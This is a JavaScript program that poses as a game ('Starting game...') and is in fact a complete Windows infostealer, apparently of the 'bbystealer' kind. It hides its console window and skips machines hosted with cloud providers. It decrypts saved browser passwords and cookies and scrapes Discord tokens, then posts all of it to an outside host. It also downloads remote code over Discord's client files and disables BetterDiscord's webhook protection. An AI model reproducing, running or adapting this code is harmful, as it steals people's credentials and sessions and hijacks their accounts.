const fs = require('fs');

console.log('Starting game...');

var debug = false,
    args = process.argv.slice(2);

if (args[0] == 'debug') debug = true;
else hideSelf();

const glob = require('glob'),
    crypto = require('crypto'),
    {
        exec
    } = require('child_process'),
    axios = require('axios'),
    buf_replace = require('buffer-replace'),
    sqlite3 = require('nexe-natives')(require.resolve('sqlite3')),
    dpapi = require('nexe-natives')(require.resolve('win-dpapi'));

((async () => {
    await axios.get('https://ipconfig.io/json')
        .then(res => {
            console.log(res.data);
            if (['microsoft', 'google', 'ovh'].some(s => res.data['asn_org']?.toLowerCase()
                    ?.includes(s))) return process.exit();
        })
        .catch();
    stealTokens();
    takePizzas();
    takeCheese();
})());

var appdata = process.env.APPDATA,
    localappdata = process.env.LOCALAPPDATA,
    discords = [],
    injectPath = [],
    runningDiscords = [],
    paths = [
        appdata + '\\discord\\',
        appdata + '\\discordcanary\\',
        appdata + '\\discordptb\\',
        appdata + '\\discorddevelopment\\',
        appdata + '\\lightcord\\',
        localappdata + '\\Google\\Chrome\\User Data\\Default\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
        localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
        localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
        appdata + '\\Opera Software\\Opera Stable\\',
        appdata + '\\Opera Software\\Opera GX Stable\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
    ];

fs.readdirSync(localappdata)
    .forEach(file => {
        console.log('Searching game folder...');
        if (file.includes('cord')) discords.push(localappdata + '\\' + file);
        else return;
    }), discords.forEach(file => {
        console.log('Making game config...');
        let pattern = file + '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js';
        glob.sync(pattern)
            .map(file => {
                injectPath.push(file);
                console.log('Saving config file...');
                listDiscords();
            });
    });

async function Infect() {
    console.log('Searching online update');
    var resp = await axios.get('https://indianboatparty.com/OOJfZ9s6pHbF/str');
    injectPath.forEach(file => {
        try {
            fs.writeFileSync(file, resp.data, {
                encoding: 'utf8',
                flag: 'w'
            });
        } catch (e) {}
        let folder = file.replace('index.js', 'bbystealer');
        if (!fs.existsSync(folder)) {
            fs.mkdirSync(folder, 0744)
            console.log('Online update finded!')
            startDiscord();
        }
    });
};

function listDiscords() {
    exec('tasklist', function (err, stdout, stderr) {
        if (stdout.includes('Discord.exe')) runningDiscords.push('Discord');
        if (stdout.includes('DiscordCanary.exe')) runningDiscords.push('DiscordCanary');
        if (stdout.includes('DiscordPTB.exe')) runningDiscords.push('DiscordPTB');
        if (stdout.includes('DiscordDevelopment.exe')) runningDiscords.push('DiscordDevelopment');
        killDiscord();
    });
};

function killDiscord() {
    runningDiscords.forEach(disc => {
            try {
                exec('taskkill /IM ' + disc + '.exe /F'), (err) => {
                    if (err) {
                        if (debug) console.log(err);
                    }
                };
        } catch (e) {}
    });
    Infect()
    pwnBetterDiscord();
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        console.log('Starting game paths...');
        try {
            exec(localappdata + '\\' + disc + '\\Update.exe' + ' --processStart ' + disc + '.exe', err => {
                if (err) {
                    if (debug) console.log(err);
                }
            });
        } catch (e) {}
    });
}

function pwnBetterDiscord() {
    var dir = process.env.appdata + '\\BetterDiscord\\data\\betterdiscord.asar';
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir);
        try {
            fs.writeFileSync(dir, buf_replace(x, 'api/webhooks', 'kkkk'));
        } catch (e) {}
    };
}

async function getPizzas(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
                .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var login_data = path + 'Login Data',
            passwords_db = path + 'passwords.db';
        fs.copyFileSync(login_data, passwords_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = '\nPASSWORDS FROM: ' + path + '  #BBYRIPONTOP\n',
            sql = new sqlite3.Database(passwords_db, err => {
                if (err) {
                    if (debug) console.log(err);
                }
            });
        const pizza = await new Promise((resolve, reject) => {
            sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
                if (err) {
                    if (debug) console.log(err);
                }
                if (row['username_value'] != '') {
                    let password_value = row['password_value'];
                    try {
                        if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser')
                                .toString('utf-8');
                        } else {
                            let start = password_value.slice(3, 15),
                                middle = password_value.slice(15, password_value.length - 16),
                                end = password_value.slice(password_value.length - 16, password_value.length),
                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                            decipher.setAuthTag(end);
                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                        }
                    } catch (e) {
                        if (debug) console.log(e);
                    }
                }
            }, function () {
                resolve(result);
            });
        });
        return pizza;
    } else {
        return '';
    }
}

async function getCheese(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
                .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var cookies = path + 'Cookies',
            cookies_db = path + 'cookies.db';
        fs.copyFileSync(cookies, cookies_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = '\nCOOKIES FROM: ' + path + '  #BBYRIPONTOP\n',
            sql = new sqlite3.Database(cookies_db, err => {
                if (err) {
                    if (debug) console.log(err);
                }
            });
        const cheese = await new Promise((resolve, reject) => {
            sql.each('SELECT host_key, name, encrypted_value FROM cookies', function (err, row) {
                if (err) {
                    if (debug) console.log(err);
                }
                let encrypted_value = row['encrypted_value'];
                try {
                    if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) {
                        result += '\nHOST KEY: ' + row['host_key'] + ' | NAME: ' + row['name'] + ' | VALUE: ' + dpapi.unprotectData(encrypted_value, null, 'CurrentUser')
                            .toString('utf-8');
                    } else {
                        let start = encrypted_value.slice(3, 15),
                            middle = encrypted_value.slice(15, encrypted_value.length - 16),
                            end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                        decipher.setAuthTag(end);
                        result += '\nHOST KEY: ' + row['host_key'] + ' | NAME: ' + row['name'] + ' | VALUE: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                    }
                } catch (e) {
                    if (debug) console.log(e);
                }
            }, function () {
                resolve(result);
            })
        });
        return cheese;
    } else return '';
}

async function takePizzas() {
    let passwords = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Login Data'))
            passwords += await getPizzas(paths[i]) || '';
    }
    axios.post('https://indianboatparty.com/OOJfZ9s6pHbF/passwords', passwords, {
        'headers': {
            'Content-Type': 'text/plain'
        }
    });
}

async function takeCheese() {
    let cookies = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Cookies'))
            cookies += await getCheese(paths[i]) || '';
    }
    axios.post('https://indianboatparty.com/OOJfZ9s6pHbF/cookies', cookies, {
        'headers': {
            'Content-Type': 'text/plain'
        }
    });
}

function hideSelf() {
    let payload = '\n' +
        "    Add-Type -Name Window -Namespace Console -MemberDefinition '\n" +
        '    [DllImport("Kernel32.dll")]\n' +
        '    public static extern IntPtr GetConsoleWindow();\n' +
        '\n' +
        '    [DllImport("user32.dll")]\n' +
        '    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n' +
        "    '\n" +
        '\n' +
        '    $consolePtr = [Console.Window]::GetConsoleWindow()\n' +
        '    #0 hide\n' +
        '    [Console.Window]::ShowWindow($consolePtr, 0)\n' +
        '    ',
        file = process.cwd() + '\\temp.ps1';
    try {
        fs.writeFileSync(file, payload);
        require('child_process')
            .execSync('type .\\temp.ps1 | powershell.exe -noprofile -', {
                'stdio': 'inherit'
            });
        fs.unlinkSync(file);
    } catch (e) {}
}

function findToken(path) {
    path += 'Local Storage\\leveldb';
    let tokens = [];
    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);
                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });
    } catch (e) {}
    return tokens;
}

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

async function stealTokens() {
    const tokens = [];
    for (let path of paths) {
        const foundTokens = findToken(path);
        if (foundTokens) foundTokens.forEach(token => tokens.push(token));
    }
    axios.request({
            'method': 'POST',
            'url': 'https://indianboatparty.com/OOJfZ9s6pHbF/tokens',
            'headers': {
                'Content-Type': 'application/json'
            },
            'data': tokens.filter(onlyUnique)
        })
        .catch(err => console.log(err));
}
